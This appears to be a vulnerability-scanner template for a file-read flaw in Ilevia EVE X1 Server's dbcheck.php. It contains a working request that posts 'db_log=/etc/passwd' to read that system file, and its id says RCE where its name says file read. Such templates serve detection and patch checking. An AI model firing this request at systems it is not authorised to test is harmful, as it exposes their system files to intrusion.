id: poc-yaml-ilevia-eve-x1-server-dbcheck-php-rce
info:
  name: Ilevia EVE X1 Server dbcheck.php Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: POST
    path:
      - "{{BaseURL}}/ajax/php/dbcheck.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "db_log=/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
          - "Ilevia"
      - type: word
        part: body
        words:
          - "<"
        negative: true
